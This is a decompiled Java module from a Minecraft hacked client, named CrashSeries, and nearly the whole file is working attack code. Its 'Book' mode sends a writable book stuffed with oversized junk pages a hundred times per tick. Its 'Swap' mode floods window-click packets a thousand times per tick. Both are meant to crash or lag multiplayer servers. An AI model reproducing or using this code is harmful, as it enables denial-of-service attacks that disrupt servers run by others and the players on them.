//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\L4J\Desktop\deobf workspace\1.12 stable mappings"!

//Decompiled by Procyon!

package me.abHack.features.modules.misc;

import me.abHack.features.modules.*;
import me.abHack.features.setting.*;
import net.minecraft.init.*;
import net.minecraft.item.*;
import net.minecraft.nbt.*;
import net.minecraft.network.*;
import net.minecraft.inventory.*;
import net.minecraft.util.*;
import net.minecraft.network.play.client.*;
import me.abHack.*;

public class CrashSeries extends Module
{
    private final /* synthetic */ Setting<Mode> mode;
    private final /* synthetic */ Setting<Boolean> escoff;
    
    @Override
    public void onTick() {
        if (fullNullCheck()) {
            return;
        }
        if (this.mode.getValue() == Mode.Book) {
            final ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
            final NBTTagList list = new NBTTagList();
            final NBTTagCompound nbtTagCompound = new NBTTagCompound();
            for (int i = 0; i < 50; ++i) {
                list.appendTag((NBTBase)new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5"));
            }
            nbtTagCompound.setString("author", "Gqrl");
            nbtTagCompound.setString("title", "https://wwww.baidu.com");
            nbtTagCompound.setTag("pages", (NBTBase)list);
            itemStack.setTagInfo("pages", (NBTBase)list);
            itemStack.setTagCompound(nbtTagCompound);
            for (int n = 0; n < 100 && !CrashSeries.mc.player.isSpectator(); ++n) {
                CrashSeries.mc.getConnection().sendPacket((Packet)new CPacketCreativeInventoryAction(0, itemStack));
            }
        }
        if (this.mode.getValue() == Mode.Swap) {
            for (int j = 0; j < 1000; ++j) {
                CrashSeries.mc.player.connection.sendPacket((Packet)new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, new ItemStack(CrashSeries.mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem()), (short)1));
            }
        }
    }
    
    public CrashSeries() {
        super("CrashSeries", "crash", Category.MISC, true, false, false);
        this.mode = (Setting<Mode>)this.register(new Setting("Mode", (T)Mode.Swap));
        this.escoff = (Setting<Boolean>)this.register(new Setting("EscOff", (T)true));
    }
    
    @Override
    public void onLogin() {
        if (this.escoff.getValue() && OyVey.moduleManager.isModuleEnabled("CrashSeries")) {
            this.disable();
        }
    }
    
    @Override
    public void onLogout() {
        if (this.escoff.getValue() && OyVey.moduleManager.isModuleEnabled("CrashSeries")) {
            this.disable();
        }
    }
    
    public enum Mode
    {
        Swap, 
        Book;
    }
}
